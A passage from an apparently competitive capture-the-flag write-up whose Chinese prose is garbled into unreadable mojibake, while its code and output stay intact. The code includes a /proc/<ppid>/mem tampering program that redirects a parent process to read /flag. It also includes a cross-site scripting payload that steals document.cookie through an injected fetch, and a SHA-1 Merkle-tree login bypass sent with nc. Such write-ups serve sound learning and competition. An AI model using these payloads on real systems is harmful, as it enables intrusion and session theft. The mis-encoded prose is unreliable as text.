`mmap`ï¼Œæ‰€ä»¥ä¹Ÿä¸èƒ½ `mprotect`ï¼Œä½†æ˜¯å¯ä»¥æ— è§†æƒé™è¯»å†™ç”¨æˆ·ç©ºé—´çš„é¡µï¼ˆè¯»é¢˜è§£ä¸ä»”ç»†å¯¼è‡´çš„ï¼‰ã€‚

```cpp
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <fcntl.h>
#include <sys/mman.h>

int main() {
    std::string line;
    std::ifstream f;

    f.open("/proc/self/status");
    if (!f.is_open()) {
        puts("Failed to open /proc/self/status");
        return 1;
    }
    std::string ppid;
    while (getline(f, line)) {
        if (line.substr(0, 5) != "PPid:") {
            continue;
        }
        ppid = line.substr(6);
        std::cout << "ppid is " << ppid << std::endl;
    }
    f.close();

    f.open("/proc/" + ppid + "/cmdline");
    while (getline(f, line)) {
        std::cout << "cmdline " << line << std::endl;
    }
    f.close();

    long first_start = 0;
    long last_end;
    f.open("/proc/" + ppid + "/maps");
    if (!f.is_open()) {
        puts("Failed to open /proc/<ppid>/status");
        return 1;
    }
    while (getline(f, line)) {
        int hyphen = line.find("-");
        int first_space = line.find(" ");
        int second_space = line.find(" ", first_space + 1);
        long start = std::stol(line.substr(0, hyphen), nullptr, 16);
        long end = std::stol(line.substr(hyphen + 1, first_space), nullptr, 16);
        std::string mode = line.substr(first_space + 1, second_space - (first_space + 1));
        std::cout << start << " " << end << " " << mode << std::endl;

        if (mode.substr(0, 3) == "rw-") {
            break;
        }

        if (first_start == 0) {
            first_start = start;
        }
        last_end = end;
    }
    f.close();
    long len = last_end - first_start;
    std::cout
        << "first_start " << first_start
        << " last_end " << last_end
        << " len " << len
        << std::endl;

    std::string mem_path = "/proc/" + ppid + "/mem";
    int fd = open(mem_path.c_str(), O_RDWR);
    if (fd == -1) {
        perror("open mem");
        return 1;
    }
    // https://stackoverflow.com/questions/5216326/mmap-on-proc-pid-mem
    char *buf = (char *)malloc(len);
    if (lseek(fd, first_start, SEEK_SET) == -1) {
        perror("lseek first_start");
        return 1;
    }
    int num_read = read(fd, buf, len);
    if (num_read != len) {
        perror("read");
        return 1;
    }
    const char *ff = "/fakeflag";
    const char *tf = "/././flag";
    int l = strlen(ff);
    for (int i = 0; i < len; ++i) {
        if (memcmp(buf + i, ff, l) != 0) {
            continue;
        }
        std::cout << "found /fakeflag at offset " << i << std::endl;
        if (lseek(fd, first_start + i, SEEK_SET) == -1) {
            perror("lseek middle");
            return 1;
        }
        if (write(fd, tf, l) != l) {
            perror("write");
            return 1;
        }
    }
    close(fd);
    free(buf);

    char *arg[] = { "/usr/bin/cat", "/flag", NULL };
    char *env[] = { NULL };
    execve(arg[0], arg, env);
    perror("execve");
}
```

```plaintext
ppid is 8
cmdline /stage2/dev/shm/executable
94018563219456 94018563350528 r--p
94018563350528 94018564702208 r-xp
94018564702208 94018565046272 r--p
94018565046272 94018565136384 r--p
94018565136384 94018565140480 rw-p
first_start 94018563219456 last_end 94018565136384 len 1916928
found /fakeflag at offset 1483197
found /fakeflag at offset 1483221
flag{<Redacted>}
```

## å¼‚æ˜Ÿæ­§é€”

æœ€å¥½ç©çš„ä¸€é¢˜ã€‚

æ‰“å¼€æ¸¸æˆï¼Œå…ˆåœ¨ Settings - Controls é‡Œäº†è§£ä¸€ä¸‹å¿«æ·é”®ã€‚å¦å¤–æŒ‰ Esc
å‘¼å‡ºèœå•å¯ä»¥é‡æ–°åŠ è½½ï¼ŒF11 å…¨å±ã€‚æœ‰äº›å•è¯ä¸æ‡‚ï¼Œå¯ä»¥åˆ‡æ¢è¯­è¨€ï¼Œä½†éœ€è¦é‡å¯æ¸¸æˆã€‚

åœ¨æŒ‰é’®é™„è¿‘å¯ä»¥çœ‹åˆ°ä¸€äº›ç´«ç°è‰²çš„å¤„ç†å™¨ï¼Œæœ‰çš„å¤§æœ‰çš„å°ï¼Œå·¦é”®å•å‡»åç‚¹ç¼–è¾‘æŒ‰é’®å¯ä»¥çœ‹åˆ°é€»è¾‘ã€‚
é¼ æ ‡æ‚¬åœå¯ä»¥çœ‹åˆ°è¯´æ˜ã€‚

ç¬¬ä¸€æ’å¼€å…³æ—è¾¹çš„å°å¤„ç†å™¨åªåœ¨ `10100101` çš„æ—¶å€™æ‰“å¼€å‘ç”µæœºã€‚

ç¬¬äºŒæ’å¼€å…³æ—è¾¹çš„å¤„ç†å™¨å°†å…«ä¸ªå¼€å…³æŒ‰äºŒè¿›åˆ¶è¯»åˆ°å˜é‡ `number`ï¼Œè¦æ±‚è¿™ä¸ªæ•°æ˜¯å®Œå…¨å¹³æ–¹æ•°ï¼Œä¸”
1 å’Œ 6 ä¸¤ä¸ªå¼€å…³æ˜¯å¼€å¯çŠ¶æ€ã€‚å†™ä¸ªè„šæœ¬æœä¸€ä¸‹ï¼Œå‘ç°ç­”æ¡ˆå”¯ä¸€ã€‚

```python
for i in range(16):
    b = bin(i ** 2 + 2 ** 8)[3:]
    if b[0] == '1' and b[5] == '1':
        print(b)
# 11000100
```

ç¬¬ä¸‰æ’å¼€å…³æ—è¾¹çš„å°å¤„ç†å™¨æ²¡çœ‹æ‡‚ã€‚

ç¬¬ä¸‰æ’å¼€å…³æ—è¾¹çš„å¤„ç†å™¨æ¯”è¾ƒå¤æ‚ï¼Œå‰ 7 ä¸ªå¼€å…³å„æ§åˆ¶äº†ä¸€äº›è®¾å¤‡ï¼Œæœ€åè¿˜ç”¨ç¬¬ 8
ä¸ªå¼€å…³è·Ÿç¬¬äºŒæ’æœ€åä¸€ä¸ªå¼€å…³æ¯”è¾ƒï¼Œä¸ç›¸åŒå°±å¼ºåˆ¶æŸä¸ªç»„åˆã€‚
ä¸€é¡¿~~çˆ†ç‚¸~~æµ‹è¯•ä¹‹åå¯ä»¥çŸ¥é“é’ååº”å †éœ€è¦å†·å´æ¶²å’Œç²‰çº¢è‰²çš„é’ï¼Œå†·å´æ¶²éœ€è¦æ°´å’Œè“è‰²çš„é’›ï¼Œ
æŸäº›ç®¡é“æ‰“å¼€åä¼šæŠŠæ¶²ä½“æ¼æ‰ã€‚æœ€ç»ˆæ“ä½œæ˜¯å…ˆæ‰“å¼€ç¬¬ 3 ä¸ªå¼€å…³å…³é—­ååº”å †ï¼Œæ‰“å¼€ç¬¬ 1ã€5ã€6
ä¸ªå¼€å…³é€å…¥é’å’Œå†·å´æ¶²ï¼Œæœ€åå…³é—­ç¬¬ 3 ä¸ªå¼€å…³å¯ç”¨ååº”å †ã€‚

ç¬¬å››æ’å¼€å…³æ¯ä¸€ä¸ªåˆ†åˆ«æ§åˆ¶å¯¹åº”çš„èƒ½é‡æºã€‚è¿™é‡Œçš„åœ°å›¾çœ‹èµ·æ¥æœ‰ç‚¹å¤æ‚ï¼Œå…¶å®åŸç†å¾ˆç®€å•ã€‚
ç›®æ ‡æ˜¯è¦è®©å·¦ä¸‹è§’çš„å‘ç”µæœºè¿è¡Œã€‚è’¸æ±½å‘ç”µæœºéœ€è¦å¯ç‡ƒç‰©å’Œæ°´ï¼Œå†…ç‡ƒæœºå‘ç”µæœºåªéœ€è¦å¯ç‡ƒç‰©ï¼Œ
ä¼ é€å¸¦éœ€è¦èƒ½é‡æ‰å·¥ä½œï¼Œè€Œç„šçƒ§ç‚‰ä¾›èƒ½ååˆ™ä¼šé”€æ¯æ—è¾¹çš„ç‰©å“ã€‚é¡ºç€æ¨å¯¼å°±å¯ä»¥çŸ¥é“éœ€è¦çš„çŠ¶æ€æ˜¯
`01110111`ã€‚

æœ€åæ˜¯å››æ’ä¹‹é—´çš„é¡ºåºï¼Œå‰ä¸‰æ’åˆèµ·æ¥ç”Ÿäº§çˆ†ç‚¸ç‰©ï¼Œç¬¬å››æ’æä¾›å†·å´æ¶²ã€‚
å®éªŒå‘ç°å†²å‡»ååº”å †æ²¡æœ‰å†·å´æ¶²ä¼šåœæ­¢ï¼Œæ‰€ä»¥å¥½åƒé¡ºåºæ˜¯ä»»æ„çš„ã€‚

## å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹  2.0

å°è¯•ä¸€ä¸‹å¯ä»¥çŸ¥é“æäº¤çš„è¯„è®ºä¼šç›´æ¥æ‹¼æ¥åˆ° HTML é‡Œï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­ã€‚

```python
'updateElement("#comment", "ä½ ç•™ä¸‹çš„è¯„è®ºï¼š' + comment + '");'
```

`updateElement` ä¼šç›´æ¥æŠŠä¼ å…¥çš„å‚æ•°å†™è¿› `innerHTML`ã€‚æµ‹è¯•çš„æ—¶å€™å¯ä»¥ç›´æ¥è°ƒç”¨
`updateElement`ï¼Œé¿å…æŠŠç»“æœé¡µç©åã€‚

è¯„è®ºç¦æ­¢äº† ``& > < ' ( ) ` . , %``ï¼Œè€Œä¸”é™åˆ¶ä¸è¶…è¿‡ 25 ä¸ªå­—ç¬¦ã€‚
ç¦æ­¢çš„å­—ç¬¦å¯ä»¥é€šè¿‡è½¬ä¹‰ä½¿ç”¨ï¼Œä½†æ˜¯ 25 ä¸ªå­—ç¬¦å®åœ¨å¤ªå°‘äº†ï¼Œå…‰æ˜¯ `\x3cimg src=1\x3e`
å°±è¦ 17 ä¸ªå­—ç¬¦ï¼Œè¿ onerror éƒ½å†™ä¸ä¸‹ã€‚æ ¹æ®æç¤ºï¼Œåº”è¯¥æ˜¯è¦ä»è‡ªå®šä¹‰çš„ç«™ç‚¹æ‰“å¼€ç»ƒä¹ ç½‘ç«™ï¼Œ
æŠŠä¿¡æ¯ä¼ é€’è¿‡å»ã€‚

é¦–å…ˆæƒ³åˆ°çš„æ˜¯ URLã€‚Query string è®¿é—®èµ·æ¥å¤ªé•¿äº†ï¼Œfragment çœ‹èµ·æ¥è¿˜è¡Œã€‚
æˆ‘ä»¬å¯ä»¥å…ˆé—­åˆå‰é¢çš„åŒå¼•å·ï¼Œç„¶åæŠŠè¡¨è¾¾å¼æ‹¼æ¥ä¸Šå»ï¼Œæœ€åå†è¡¥ä¸ŠåŒå¼•å·ã€‚

`"+location["hash"]+"`

ä½†æ˜¯ `hash` ä¼šè¢« URL encodeï¼Œä¸èƒ½ç›´æ¥ç”¨ã€‚å…ˆä¸è¯´ `decodeURIComponent`
æ ¹æœ¬å¡ä¸è¿›å»ï¼Œåœ¨è¿™ä¸ªé™åˆ¶ä¸‹å¯æ²¡æ³•è°ƒç”¨å‡½æ•°ã€‚æƒ³äº†åŠå¤©æ€ä¹ˆåœ¨ URL encode
è¿‡çš„æƒ…å†µä¸‹åœ¨å‰ååŠ å†…å®¹èƒ½å˜æˆèƒ½æ‰§è¡Œ JavaScript çš„ HTMLï¼Œæ²¡æƒ³å‡ºæ¥ã€‚

ç„¶åæƒ³åˆ°äº† `javascript:` åœ°å€ã€‚å°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥å¼€ä¸€ä¸ªæ•°ç»„ï¼Œåœ¨é‡Œé¢ç”¨èµ‹å€¼è¡¨è¾¾å¼ã€‚

`"+[location=1]+"`

å¤ªé•¿äº†ï¼Œæƒ³äº†ä¸€ä¼šä¸çŸ¥é“æ€ä¹ˆæŠŠ `hash` æ”¾è¿›å»ã€‚

åˆæƒ³åˆ°ç”¨ `Referrer` ä¼ ä¿¡æ¯ï¼Œä½†æ˜¯ `open` æ²¡æ³•æ”¹ã€‚

æ¯”èµ›å¿«ç»“æŸçš„æ—¶å€™çœ‹åˆ°ç¾¤é‡Œæœ‰äººè¯´ 8 å­—èŠ‚å¯ä»¥å®Œæˆï¼Œç¬¬ä¸€ååº”æ˜¯è¿™æ˜¯ä»€ä¹ˆé­”æ³•ï¼Œ
ç„¶åæƒ³åˆ°è¿™æ ·èŒƒå›´å°±å°äº†å¾ˆå¤šã€‚ç¿»äº†ç¿»
[Window](https://developer.mozilla.org/en-US/docs/Web/API/Window)ï¼Œé‡Œé¢çš„
`name` åˆšå¥½æ˜¯ `open` å¯ä»¥æ§åˆ¶çš„ï¼Œè€Œä¸”ä¸ä¼šè¢«ç¼–ç ï¼Œé‚£ç›´æ¥ `"+name+"` å°±è¡Œäº†ã€‚

å‰©ä¸‹çš„é—®é¢˜æ˜¯æ€ä¹ˆæŠŠ flag ä¼ å‡ºæ¥ã€‚å°è¯•äº† `console`ã€`alert` å’Œ `throw` éƒ½æ²¡ååº”ã€‚bot
æœ¬èº«åªæµè§ˆä¸åšå…¶ä»–åŠ¨ä½œï¼Œç¿»äº† selenium
[æ–‡æ¡£](https://www.selenium.dev/selenium/docs/api/py/common/selenium.common.exceptions.html)
ï¼Œé‡Œé¢çš„å¼‚å¸¸åŸºæœ¬éƒ½ä¸ä¼šè¢«é¡µé¢çš„ JavaScript è§¦å‘ã€‚å°è¯• open æ— æ³•è®¿é—®çš„ URL ä¹Ÿæ²¡åŠ¨é™ã€‚

ç„¶åç»ˆäºæƒ³åˆ°ç”¨ç»ƒä¹ ç½‘ç«™çš„è¯„è®ºåŠŸèƒ½ã€‚å› ä¸ºç¦æ­¢äº†ä¸€éƒ¨åˆ†å­—ç¬¦ï¼Œæ‰€ä»¥å…ˆ base64
ç¼–ç ï¼Œæ‹†å¼€åˆ†å¤šæ¬¡å‘ã€‚æ¯å‘å®Œä¸€æ¬¡éœ€è¦å°†è¯„è®ºæ¢å¤æˆ `"+name+"`ï¼Œä»¥åŠä¿®æ”¹ `substring`
çš„å‚æ•°ã€‚

```html
<!DOCTYPE html>
<html>
    <script>
        window.open('http://web/result', '\x3Cimg src=1 onerror="fetch(\'http://web/result\', { \'method\': \'POST\', \'headers\': { \'Content-Type\': \'application/x-www-form-urlencoded\', }, \'body\': \'comment=\' + btoa(document.cookie).substring(50, 75), })" />');
        // const data = new URLSearchParams();
        // data.append('comment', 'bot');
        // fetch(
        //     // 'http://web/result',
        //     'http://202.38.93.111:10051/result',
        //     {
        //         'method': 'POST',
        //         'headers': {
        //             'Content-Type': 'application/x-www-form-urlencoded',
        //         },
        //         'body': 'comment=' + btoa(document.cookie).substring(0, 25),
        //     }
        // )
    </script>
</html>
```

base64 è§£ç ï¼Œ`decodeURIComponent`ï¼Œæäº¤ï¼Œæç¤ºé”™è¯¯ã€‚çœ‹äº†è¡¥å……è¯´æ˜ï¼ŒåŸæ¥è¦ç”¨
`urllib.parse.unquote_plus`ã€‚

## O(1) ç”¨æˆ·ç™»å½•ç³»ç»Ÿ

å¯¼å…¥ç”¨æˆ·åŠŸèƒ½ä¼šç”¨è¾“å…¥çš„ç”¨æˆ·åˆ—è¡¨å»ºç«‹ä¸€æ£µ SHA-1 Merkle Treeï¼Œç™»å½•æ—¶ä¼šç”¨è¾“å…¥çš„ç”¨æˆ·ä¿¡æ¯å’Œ
sibling hash è®¡ç®—å‡ºæ ¹èŠ‚ç‚¹ï¼Œæ£€æŸ¥æ˜¯å¦ç›¸åŒã€‚é™åˆ¶æ˜¯å¯¼å…¥æ—¶ç”¨æˆ·åä¸èƒ½ä¸º `admin`ï¼Œä½†éœ€è¦ä»¥
`admin` èº«ä»½ç™»å½•æ‰èƒ½æ‹¿åˆ° flagã€‚

æƒ³äº†ä¸€ä¼šï¼Œæƒ³åˆ°å¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ª `user:pass` æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå®ƒçš„ SHA-1 å¼€å¤´åˆšå¥½ä»¥
`b"admin:"` å¼€å¤´ï¼Œé‚£ä¹ˆæ§åˆ¶ä¸€ä¸‹å¤§å°è®©çˆ¶èŠ‚ç‚¹å˜æˆ `sha1(b"admin:..." +
sibling_hash)`ï¼Œå°±å¯ä»¥ç›´æ¥ç”¨æ‹¼æ¥åçš„ admin ç™»å½•äº†ã€‚å› ä¸ºè¦æ±‚å¼€å¤´ 6 å­—èŠ‚ä¸ºå›ºå®šå€¼ï¼Œ
æœŸæœ›å¤§æ¦‚æ˜¯ `2 ** 48` æ¬¡ hashã€‚

ç®€å•æµ‹è¯•äº†ä¸€ä¸‹ï¼ŒPython å•çº¿ç¨‹åªæœ‰å¤§æ¦‚ 1MH/sï¼Œè¦è·‘å‡ åƒå¤©ã€‚æœç´¢äº†ä¸€ä¸‹ï¼Œ
æ²¡æ‰¾åˆ°èƒ½æ»¡è¶³è¦æ±‚çš„ç®—æ³•ï¼Œæ¯•ç«Ÿ Bitcoin çš„ PoW ä¹Ÿæ˜¯è¿™ç§å½¢å¼ã€‚

SHA-1 æœ‰ length-extension attackï¼Œä½†è¿™é¢˜å¥½åƒç”¨ä¸ä¸Šã€‚

åˆæ‰¾äº†ä¸€ä¸‹ï¼Œæ‰¾åˆ° hashcatã€‚è·‘ä¸€ä¸‹ benchmarkï¼Œåœ¨æˆ‘çš„ iGPU ä¸Šå±…ç„¶æœ‰ 1GH/s
å·¦å³ï¼Œå¤ªå¼ºäº†ï¼Œæ„Ÿè§‰æœ‰å¸Œæœ›ã€‚

ç„¶è€Œ hashcat æ˜¯ç”¨æ¥ç ´è§£å¯†ç çš„ï¼Œhash åªèƒ½ç”¨å›ºå®šåˆ—è¡¨ï¼Œä¸èƒ½æ»¡è¶³è¿™ä¹ˆå¥‡æ€ªçš„éœ€æ±‚ã€‚
çœ‹äº†ä¸€ä¸‹ä»£ç å’Œ
[æ–‡æ¡£](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-plugin-development-guide.md)
ï¼Œåº”è¯¥å¯ä»¥æ”¹ OpenCL ä»£ç é‡Œé¢çš„åˆ¤æ–­é€»è¾‘ã€‚è¯è¯´ä»£ç å¥½åƒåªæ£€æŸ¥äº† 4 ä¸ª u32ï¼Œä¸€å…± 128 bitsã€‚

æ­£å‡†å¤‡åŠ¨æ‰‹ï¼Œçœ‹åˆ°ç¾¤é‡Œæœ‰äººè¯´è¿™é¢˜å…¶å®å¾ˆç®€å•ã€‚æˆ‘ä¹Ÿè§‰å¾—å¥‡æ€ªï¼Œé¢˜ç›®çš„ç®—åŠ›è¦æ±‚å®åœ¨æœ‰ç‚¹é«˜ã€‚
åˆæƒ³äº†ä¸€ä¸‹ï¼Œå…¶å®å¯ä»¥åè¿‡æ¥ï¼Œè®© `"admin:..."` hash æˆ
`b"user:pass"`ï¼Œå¯¼å…¥ç”¨æˆ·çš„æ—¶å€™å¯¼å…¥ `b"user:pass"` è·Ÿå¦ä¸€ä¸ª hash æ‹¼æ¥åçš„ç»“æœå°±è¡Œã€‚
ä¸€å¼€å§‹æ²¡æ³¨æ„ï¼Œä½†è¾“å…¥çš„å†…å®¹éœ€è¦èƒ½æŒ‰ UTF-8 è§£ç ã€‚

```python
from hashlib import sha1
import random

while True:
    preimage = ('admin:' + random.randbytes(8).hex()).encode()
    digest = sha1(preimage).digest()
    if digest.count(b':') != 1:
        continue
    if b'\n' in digest:
        continue
    user, pass_ = digest.split(b':')
    try:
        user.decode()
        pass_.decode()
    except UnicodeDecodeError:
        continue
    print(preimage)
    print(digest.hex())
    break
# b'admin:e099c03d200a7cbf'
# 48697e2e18dea3462a6902063369553a6720d4b2
```

```shell
extra_proof=01234567890123456789
innocent_user=Testla:Testla
echo 1 > input.txt
printf "%s" "$extra_proof" >> input.txt
echo 48697e2e18dea3462a6902063369553a6720d4b2 | xxd -r -p >> input.txt
echo >> input.txt
echo "$innocent_user" >> input.txt
echo EOF >> input.txt
echo 2 >> input.txt
echo "admin:e099c03d200a7cbf:$(printf "%s" "$extra_proof" | xxd -p)$(printf "%s" "$innocent_user" | sha1sum | cut -d " " -f 1)" >> input.txt
cat token.txt input.txt | nc 202.38.93.111 10094
```

## å° Z çš„è°œé¢˜

çº¦æŸä¸å¤šï¼Œä½†ç¡®å®é”™ç»¼å¤æ‚ã€‚æƒ³äº†åŠå¤©æ²¡æƒ³åˆ°æ€ä¹ˆæœï¼Œè®© Z3 å¸®å¿™è§£ã€‚

```python
import itertools
import z3


bound = 5
constraints = ((1, 1, 3), (1, 2, 2), (1, 2, 4), (1, 4, 4), (2, 2, 2), (2, 2, 3))
count = [3, 4, 2, 2, 2, 3]
num_constraints = sum(count)
num_dims = len(constraints[0])
arrange = [[[0 for i in range(3)] for j in range(num_dims)] for k in range(num_constraints)]

solver = z3.Solver()
a = []
index = 0
for constraint, c in zip(constraints, count):
    for _ in range(c):
        element = [
            [
                z3.Int(f'a[{index}][{second_dim}][{k}]')
                for k in range(2)
            ]
            for second_dim in range(3)
        ]
        a.append(element)

        for second_dim in range(3):
            for k in range(2):
                solver.add(0 <= element[second_dim][k])
                solver.add(element[second_dim][k] <= 5)

        # stage 2
        for other_index in range(index):
            solver.add(z3.Or(*(
                z3.Or(
                    element[second_dim][1] <= a[other_index][second_dim][0],
                    a[other_index][second_dim][1] <= element[second_dim][0],
                )
                for second_dim in range(3)
            )))

        # stage 3
        solver.add(z3.Or(*(
            z3.And(*(
                element[second_dim][1] - element[second_dim][0] == diff[second_dim]
                for second_dim in range(3)
            ))
            for diff in set(itertools.permutations(constraint))
        )))

        index += 1

check_result = solver.check()
print(check_result)
if check_result != z3.sat:
    exit(1)
m = solver.model()
l = [
    [
        [
            m[a[i][j][k]].as_long()
            for k in range(2)
        ]
        for j in range(num_dims)
    ]
    for i in range(num_constraints)
]
l = sorted(l)
for i in range(num_constraints):
    for j in range(num_dims):
        for k in range(2):
            print(l[i][j][k], end='')
print()
```

ç”¨æ—¶åæ¥ç§’ï¼Œè§£å‡ºæ¥åˆ†æ•°æ˜¯ 147ï¼Œèƒ½æ‹¿åˆ° flag1ã€‚

flag2 å’Œ flag3 åˆ†åˆ«è¦æ±‚åˆ†æ•° \<= 136 å’Œ \>= 157ã€‚åˆ†æ•°æ˜¯ç¬›å¡å°”ç§¯çš„é›†åˆå¤§å°ï¼Œä½†æ˜¯
`SetHasSize` ç”±äºå®ç°é—®é¢˜è¢«
[ç§»é™¤](https://github.com/Z3Prover/z3/issues/3854) äº†ã€‚ä¸€é¡¿æœç´¢ï¼Œæ‰¾åˆ°ä¸€ä¸ª
[å›ç­”](https://stackoverflow.com/questions/74265354/z3-how-to-count-matches)
ã€‚å…ˆç”¨ 7 è¿›åˆ¶ç¼–ç  tupleï¼Œç„¶åç»Ÿè®¡ `IsMember`ï¼Œå†™äº†
[calculate_score.py](./26-å°%20Z%20çš„è°œé¢˜/calculate_score.py)ã€‚

è¿è¡Œèµ·æ¥å¥½ä¸€ä¼šä¸å‡ºè§£ï¼Œæ„Ÿè§‰ä¸å¦™ã€‚æ¢ä¸€ä¸ªæ€è·¯ï¼Œä¸åœåœ°ç”Ÿæˆæ–°çš„è§£ï¼Œæ‰‹åŠ¨è®¡ç®— scoreã€‚
å‚è€ƒè¿™ä¸ª
[å›ç­”](https://stackoverflow.com/questions/11867611/z3py-checking-all-solutions-for-equation/70656700#70656700)
å†™äº† [all_smt.py](./26-å°%20Z%20çš„è°œé¢˜/all_smt.py)ã€‚

```plaintext
score=147
010103011504040135041545130203132304133502133523133534141234350201350213352502352524450235452545
score=144
021413023535024513030145031335040104041501231513233535341214350245352335352513353535450204452501
score=144
020202022324022402023424030145030224041545044504230202232404341434350135350203352403451535454503
score=151
010301013502013524020213022315023545030235123414150401154504230413252435254545350214350245352413
score=147
010424030202032402034501040445044515130224133424152324343414350224350302353501450345453513453535
score=146
010103010235022535023502031302041523141234150104150245242535243502341302451324451502452545453524
score=146
022402022424030145030202030224041545044504232404341434350102350135350423351402451335453535454503
```

è¿è¡Œèµ·æ¥å¾ˆå¿«å‡ºäº† 7 ç»„è§£ï¼Œç„¶åå°±ä¸åŠ¨äº†ã€‚å°è¯•å¸® Z3 å‰ªæï¼Œè¦æ±‚ stage 3 æ¯ç§ constraint
å†…éƒ¨çš„ç»„åˆä¸é‡å¤ã€‚åˆå†™äº†
[search.py](./26-å°%20Z%20çš„è°œé¢˜/search.py)ã€‚

è¿˜æ˜¯ä¸å‡ºè§£ï¼Œåˆçæ”¹äº†ä¸€ä¸‹ï¼Œé‡åˆ° unsat çš„æ—¶å€™å¿«é€Ÿ backtrackã€‚å‡ åˆ†é’Ÿè·‘å®Œï¼Œunsatã€‚

æ”¾ç€å‡ ä¸ªè„šæœ¬å»ç¡è§‰ã€‚æœ€å `all_smt.py` å’Œ `calculate_score.py` éƒ½è·‘äº†åå¤šä¸ªå°æ—¶ï¼Œ
å‰è€…ç¬¬ 8 ä¸ªè§£ä¸€ç›´å‡ºä¸æ¥ï¼Œåè€…æ²¡å‡ºè§£ï¼Œ`search.py` è·‘äº† 5 ä¸ªå°æ—¶åˆ° `4851/189000`ï¼Œ
ä¼°è®¡ä¸€å…±è¦åå¤šå¤©ã€‚æ¯”èµ›ç»“æŸã€‚

çœ‹äº†é¢˜è§£ï¼Œä¼°è®¡æ˜¯ç®—åˆ†æ•°æ—¶ç”¨çš„ `IsMember` çš„é”…ã€‚æ—©çŸ¥é“ä¸å¼„è¿™äº›èŠ±é‡Œèƒ¡å“¨çš„ï¼Œç›´æ¥å¡
`== && == && ==`ã€‚

## éƒ¨åˆ†æ²¡é€šè¿‡çš„é¢˜ç›®

### é€†å‘å·¥ç¨‹ä¸éœ€è¦ F5

ç”¨ ghidra æ‰“å¼€ï¼Œå…³è”åŠ¨æ€åº“ï¼ŒåŸæ¥ä¸æ˜¯ä¸éœ€è¦ F5ï¼Œæ˜¯ F5 ä¸å·¥ä½œã€‚å‡½æ•°ç›´æ¥è¿åè°ƒç”¨çº¦å®šï¼Œ
å†™äº†ä¸€äº›å¥‡æ€ªçš„æ±‡ç¼–ã€‚ghidra åç¼–è¯‘å™¨è®¤ä¸ºè¿™äº›æ±‡ç¼–æ²¡æ•ˆæœï¼Œä½†å®é™…æ˜¯æœ‰çš„ã€‚ä¼°è®¡æ¥ä¸åŠçœ‹ï¼Œ
å°±å»å†™å° Z äº†ã€‚åˆšçœ‹åˆ°çš„æ—¶å€™ä¹Ÿæƒ³åˆ°äº† Hackergame 2021
[è¶… OI çš„ Writeup æ¨¡æ‹Ÿå™¨](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E8%B6%85%20OI%20%E7%9A%84%20Writeup%20%E6%A8%A1%E6%8B%9F%E5%99%A8/README.md)
é‡Œçœ‹åˆ°çš„ angrï¼Œä¸è¿‡æ²¡ç”¨è¿‡è€Œä¸”ä¸çŸ¥é“æ˜¯å¦æ”¯æŒåŠ¨æ€åº“ã€‚

## æ„Ÿæƒ³

å…¬å¸ƒæ—¥ç¨‹ï¼šGeekGame-3rd ååªæœ‰å‡ å¤©æ—¶é—´ä¼‘æ¯ï¼Œéš¾é¡¶ã€‚

è¯»é¢˜åšé¢˜ï¼šæ€ä¹ˆ MyGO!!!!! å«é‡æ¯” GeekGame-3rd è¿˜é«˜ï¼ˆç‹‚å–œï¼‰ï¼Œç»™äººä¸€ç§ MyGO
ç«äº†çš„æ„Ÿè§‰ã€‚

ç½‘å‹ä»¬çš„æ•°ç†åŸºç¡€ç«Ÿå¦‚æ­¤æ‰å®.jxl
